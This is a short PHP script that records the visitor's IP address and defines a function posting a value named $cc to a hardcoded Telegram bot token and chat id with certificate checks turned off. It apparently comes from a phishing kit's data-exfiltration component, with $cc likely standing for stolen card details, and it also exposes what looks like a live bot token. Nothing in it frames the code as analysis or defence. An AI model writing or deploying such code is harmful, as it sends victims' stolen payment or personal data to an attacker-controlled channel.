<?php

$ip  = $_SERVER['REMOTE_ADDR'];
function functiondilih($cc) {
	
    $ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot1630245820:AAFL8Nhw9Bz3_R4HdQSzDB94G72KYyI2hGw/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=-685825800&text=".$cc);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);

curl_close ($ch);
}